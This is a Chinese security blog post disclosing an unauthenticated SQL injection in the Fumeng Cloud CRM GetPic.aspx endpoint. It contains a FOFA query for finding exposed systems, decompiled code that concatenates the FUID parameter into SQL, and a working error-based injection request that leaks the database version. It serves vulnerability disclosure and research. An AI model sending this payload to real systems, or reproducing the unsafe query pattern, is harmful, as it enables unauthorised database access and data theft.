---
title: "孚盟云CRM GetPic.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html
asset_dir: assets/孚盟云crm-getpic.aspx-sql注入漏洞
---

# 孚盟云CRM GetPic.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/18 12:27
* 884浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

软件即服务

认证

客户关系管理


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetPic.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetPic.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetPic` 方法的实现如下

```
public class GetPic : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    DataTable table = this.dbHelper.Query($"select * from dcFile where FUID='{this.Request.QueryString["FUID"]}'").Tables[0];
```

深入探索

SQL

漏洞扫描服务

Web安全课程

未经过滤或参数化绑定的参数 `FUID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetPic.aspx?FUID=%2d%31%27%41%4e%44%20%31%3d%40%40%56%45%52%53%49%4f%4e%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetPic.aspx SQL注入漏洞](images/img-001-fc2e1aaf130f.webp)](https://image.mrxn.net/0fe68a73b8474d47bde4872003d1f674.webp)

通过报错注入 成功在响应回显数据版本信息

SQL注入检测工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM GetPic.aspx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKeklEQVR4AeybgXbbuA5Ec/v//9zNCB0SJiFZdpzI23JP0QFnBhBDiHGy7+2vj4+P31+N38M/ud8g3V2erc0+51XzUfM6Y64zn7kqH31efxU1kM8e68+7nEAbyOdb8PFInP0CgA+4jaoWwpP3MPogPEC5Vwh9rNMaZs3Pkj4GhB8Ypbtr9z2LuWEbSCZXft0JTAMBpjcaOvfsVvPbAr0fRO6+EGvoaC33MJfReuacW8toDY6fBaHbfxYh6qDGqs80kMq0uJ87gTWQnzvrU0/6loHkbwvOoV9bc/fQXwFErdd7COGDjvZCcF4LYea8J+lXxLcM5Iov5G955ksHAvMbB8H5zRNCcPkQITjoKK8i+8Ycjv2qzzHWj2uIfiOvNYQG/cdu8a+Mlw6kbWwlT5/AGsjTR/c9hdNA8vWu8qNt2J895qBfd+vQOfsy2mcOun/U5IHQlTsgOJjRnozu+wrMfau8esY0kMq0uJ87gTYQmN8g2OeqLUL4swbB5TfEeuYgfNaEMHPic0B4oH/Qwsy55t4z7avwbC3058P9PD+rDSSTK7/uBNZArjv78sm/8jV8Nh87Q7+m1mDmrO2h91PpEP3sEVY+c9IVEHVw/C0Ous89oHPqpbCm/BWxbohP9E1wGgj0twAir/YKoUFH+/KbcsRZE7pG+V7YI6w8EHuR7oDgIDDXQXD2CiG47DvKIfzQ0X6YOWt7OA1kz/gG/D+xhV/Qpwj9+6relqMTkD5G5bcna+bg9tlQr3Ot86rHEee6jPZnzrm1jNaEEHtVPgbc1yA8cIvrhoynefF6DeTiAYyPbwPx1cwGc9CvlXWYucoP4XOdEIKz/x6qZi9yLcx94Zbb62Pe/SDqoKO1jGOdtCPOWkbVONpAsmHl151A+8UQ+psAt3m1PU9UCOE/8lVa5mC/h30QHsDUzf9DppEp0f4UwOZNUkshNKBxqnE0MiXA1s8eiDX0H4ySvaX2Z4Reu25IO6r3SNZA3mMObRdtIPkKObfLayH06wWRi1dArF0nhOCgo3gFPMbpGQ7VK7zOKP5MQDw/10Jw0NE6zJyfY48QwmdNCMFBR/FjtIGMwj+zfrMvtA0E+uQgck1bkfes9RhZV551rRX3uKw7h9iH6seA0KCjPdA5iNyae2e0JjSvfAxrwlGDeA4cf6iPdVqrn6MNRMKK609gDeT6GdzsoP3LRV+ZrEK/hhC5dYg1YKr9NxvA9jM69OsLx1xrUiTeG/Qeha09M2uuNcJxD9faL4SosXYPIfzQ0TXq54CuQ+Trhvik3gSn39Q9PWG1R4hJSnfYB7MGwdkjhOBcLxSvgNAALbcAtrdfvjE2w8FfELUQmOshOOhYtXINdB9EfuTPmntUnDXhuiH5hN4gXwN5gyHkLbQPdZMQVxEwVSKwfRuBjrpyilyg9RjWodeaO0Lofog8+8fnVGuIOqCVZh8wfV0QXCsoktyjkEsKoi90XDekPKovk083aB/qecLOj7raI7QPYtJeZ4TQgEar1gFsb2YTPxNrn+lDfyB6QUc3cE+hOeg+8QprQq0VyseAqM08BKcaR9bH3B7huiHj6Vy8nj5Dqv1ocmNAvAXQf/mzJ/eA8GXOOYQGmGq/XKqXSeUKr4VajyFeMfJaA9sNhI7iFapxQOheZ5TXYX5cizcH0QtqtE81jnVDfBJvgmsgbzIIb6N9qJuAfr0qDkL3dRNCcBDoOqH0McSfCbjtl/u4HsIDx2h/7gFRk7nKZy6jayB6wIz2CHOtc4gar4XrhugU3igeHoimrYCYLnD45QCnPkzVUwHd78YQnNd7qHpF1rVWmIPoBf2HEZg5+4UQuvJHAqIOOCwD2hk9PJDDzkv88gmsgXz5CF/b4PD3EF31Mfz4kc9r6FfQ/gqrmsyNNdD7QuTZD/uce2V/xUH0sJYRQoOO7pd9VX7Wt25IdXoXcu3HXoip39sLhA/28WyPez6/Vcbsr7isOx99MO/b3j10jwr3asRnP8RzxY+RfeuGjKdz8XoN5OIBjI9vH+q+NqNhb22/0B7le2FPRohrDGR6N8+9ge1n92y2DqFBR2sVQvflfkc59BrgxupnANsegaZbEzYyJeuGpMN4h7R9qFebAbYJH2kw/8Zb+TOnt2MvIJ4J5JLdHNj2CDRP1RtoPoi8FaTEtRAeoKlA62FfhRC+VviZ2AehAZ/s/GfdkPlMLmXaQIBt+nk31VTNZcw1Yw7Rt/JDaMBYtq2Bmz1BrKHfys04/AXdZ8nP91oI4VM+hv1CmH1wy0Gsoe9NtQ4IPT9n1ICPNpCPH/tnPejoBNZAjk7nAm36sdfXSFjtB+LqQUf7VKPwWqi1QrkDotZrIQQn7xjS9yJ79zziYe4vXpF7QPjEnwkIf+5xVJd9ELXZv25IPo03yJ8eSJ70o1+Ha3NdxcH8BuWaMYd9v/tDeKB/+I59xrVrR17rSoP+DIhc3jFcm/HpgYzN1/o1J7AG8ppzfFmXU7+p5yvlHOIqwozV7uBx39jHzxZC9Mse8WNYh9kPwUFH17tOCKErHwNmreox1u2t1w3ZO5mL+DYQiElDR+8JZs5vgdA+5Qqv91AeRdYhniF+DAgt+51DaICpEt0zi+YyWge2f0sA9Yd/rlHuOiFErfgxIDRA1inaQCblf0b8LdtdA3mzSU6/qVf7y9fOOtCutLkjrHpkv/XMQTyj0rJvzCHqgCYB234bcSfxM4UQtcodLofQoOPokRdCV+6AmVs3xKfzJnj4Y2+1R4ip+i3IeOSHqIOO2Q+dh8jd2z4IHuoPWvvOIvR+sJ8f9Rv3KC/MvcSfiXVDzpzSD3rWQH7wsM88qg0E4pr5CmaE0IDWE9g+JGHGZkpJ7pfollpvxGcCt73tEX7K0x8Iv3SHTeNafMWJV1gTaj0GxLMgcNSfXbeBPNtg1b32BNpA9CYoqvbiz8RRLcSbBP0DOfd07RFnjxCin/IzAbMfgsvPdH6mpzz2Vyh9jOyzBrEPYP1v6h+H//y82H4xhD4leCwftw1zffVmjHVaQ6/V+pmA3gMi9/Nzv4qzDlEH/UZD5+wzwr5mjxBmn/chbN+yZF5x/QmsgVw/g5sdtIHoujwSN13+LFz/Z7mBOZiv6mb48xeEbr/wj9R+vPZaKF2h3KH1GNYqhHhmpeU+sO9zbfaby5j1Mc++NpBMrvy6E5gGAvE2QI2PbhWiT66DmbMOoQGmGgLttkDk+W2D4KCjiyG47B81wFSJ92qBm/3lJnCrAU0GWt00kOZaySUnsAZyybHvP/SlA4G4evlxvuYVB+EHstxy11bYTEWS/ZbNeb2HwPbto9IhNOi/m7hvhVWP7IPol30vHUhuvPL9EzhSvmUg1VtwjzvaJMSbBB0rv58B3Tdyuc5ahZUvc0c5xPNzX/shNOi3zJrwWwaixiueO4E1kOfO7duqpoHka1blRzuxH/q1tB9mzprQtRkhaszJNwaEB2iS/UKTyhXA9qENNdqfEcKregcEBzNWHvezJoSoVe6YBuLChdecQBsIxLTgHB5t19O+h0c97mnufc8H8fXY57o9tO8suk/lt5ax8mWuDSSTK7/uBNZArjv78sn/AQAA//+97I38AAAABklEQVQDANvuAGinIkE2AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 